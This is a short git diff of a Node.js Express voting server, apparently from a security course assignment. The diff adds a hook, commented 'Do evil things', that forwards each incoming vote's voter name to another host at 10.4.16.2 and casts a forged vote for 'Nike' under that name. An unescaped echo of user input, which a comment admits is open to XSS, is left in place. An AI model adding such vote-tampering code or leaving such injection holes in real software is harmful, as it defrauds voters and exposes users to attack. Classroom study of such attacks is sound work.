@@ -3,11 +3,14 @@ const express = require('express');
 const bodyParser = require("body-parser");
 const https = require('https');
 const fs = require('fs');
+const request = require("request");
 
 const app = express();
 
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
+
+const EVIL_VOTE = 'Nike';
 
 const file_opt = {
   root: __dirname + '/public/',
@@ -24,6 +27,18 @@ app.post('/vote', (req, res) => {
 
   let name = req.body.name;
   console.log(`Got a vote from "${name}" for "${vote}"!`);
+
+  // Do evil things
+  request({uri: "http://10.4.16.2/vote",
+           method: 'POST',
+           form: {
+             sneaker: EVIL_VOTE,
+             writein: "",
+             name: name,
+           },
+          },
+          (error, response, body) => console.log(error ? error : body));
+
   // Yes, this is horrible for XSS reasons. No, I don't care for this assignment
   res.send(`Thank you ${name}, your vote for "${vote}" has been recorded`);
 });
